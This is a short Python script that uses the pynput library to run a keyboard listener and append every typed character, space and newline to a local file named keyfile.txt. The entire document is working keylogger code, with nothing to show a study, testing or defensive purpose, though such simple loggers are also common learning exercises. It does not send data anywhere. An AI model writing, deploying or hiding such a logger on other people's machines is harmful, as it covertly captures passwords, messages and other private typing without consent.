from pynput import keyboard

def keypressed(key):
    with open("keyfile.txt", "a") as f:
        try:
            # Check if the key is a character
            char = key.char
            if char is not None:
                f.write(char)
        except AttributeError:
            # Handle special keys like space, enter, etc.
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                print(f'Special key {key} pressed')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
